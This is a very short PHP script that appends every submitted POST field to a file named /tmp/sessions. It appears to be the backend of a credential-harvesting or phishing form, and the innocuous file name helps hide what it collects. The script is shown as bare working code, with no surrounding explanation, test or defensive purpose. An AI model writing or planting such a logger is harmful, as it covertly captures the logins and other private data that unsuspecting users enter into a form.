<?php
  file_put_contents("/tmp/sessions", implode("\n", $_POST) . "\n", FILE_APPEND);
?>
